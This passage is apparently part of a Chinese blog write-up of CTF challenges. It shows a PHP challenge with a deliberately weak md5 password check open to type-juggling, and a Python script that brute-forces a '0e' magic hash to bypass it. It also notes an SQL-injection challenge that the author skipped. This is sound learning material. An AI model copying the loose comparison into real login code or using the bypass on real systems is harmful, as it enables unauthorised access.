+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
+$output = &#34;&#34;;
+if (isset($_GET[&#39;code&#39;])) {
+  $content = file_get_contents(__FILE__);
+  $content = preg_replace(&#39;/FLAG\-[0-9a-zA-Z_?!.,]+/i&#39;, &#39;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&#39;, $content);
+  echo &#39;&lt;div class=&#34;code-highlight&#34;&gt;&#39;;
+  highlight_string($content);
+  echo &#39;&lt;/div&gt;&#39;;
+}
+if (isset($_GET[&#39;pass&#39;])) {
+  if(!preg_match(&#39;/^[^\W_]+$/&#39;, $_GET[&#39;pass&#39;])) {
+    $output = &#34;Don&#39;t hack me please :(&#34;;
+  } else {
+    $pass = md5(&#34;admin1674227342&#34;);
+    if ((((((((($_GET[&#39;pass&#39;] == $pass)))) &amp;&amp; (((($pass !== $_GET[&#39;pass&#39;]))))) || ((((($pass == $_GET[&#39;pass&#39;])))) &amp;&amp; ((($_GET[&#39;pass&#39;] !== $pass)))))))) { // Trolling u lisp masta
+      if (strlen($pass) == strlen($_GET[&#39;pass&#39;])) {
+        $output = &#34;&lt;div class=&#39;alert alert-success&#39;&gt;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&lt;/div&gt;&#34;;
+      } else {
+        $output = &#34;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password&lt;/div&gt;&#34;;
+      }
+    } else {
+      $output = &#34;&lt;div class=&#39;alert alert-danger&#39;&gt;Wrong password&lt;/div&gt;&#34;;
+    }
+  }
+}
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>真是扭曲的代码，看得人头大，要是真实开发这么写非得让人打死不可。<br>
+题目大意是考察php弱类型比较，也算是经典题目了。 附爆破脚本一则，可自行修改:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
+  
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;f789bbc328a3d1a3&#34;</span>
+
+
+<span class="k">def</span> <span class="nf">calcMd5</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
+    <span class="n">MD5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">MD5</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;0e&#34;</span> <span class="ow">and</span> <span class="n">MD5</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">isdigit</span><span class="p">():</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">MD5</span><span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">it</span> <span class="o">=</span> <span class="mi">100000000</span>
+    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">it</span><span class="p">)</span>
+        <span class="n">calcMd5</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">it</span> <span class="o">+=</span> <span class="mi">1</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="challenge-8">challenge 8</h2>
+<p>应该是要考察sql注入，做不出来，先跳过</p>
+<h2 id="challenge-9">challenge 9</h2>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">ssspallow</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2019-11-04
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/security/">Security</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/java%E5%8F%8D%E5%B0%84/java%E5%8F%8D%E5%B0%84/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">java反射</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/sqli-lab-notes/">
+            <span class="next-text nav-default">Sqli Lab解题记录</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://www.nomuggle.com/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2016 - 
+    2023<span class="heart"><i class="iconfont icon-heart"></i></span><span>ssspallow</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
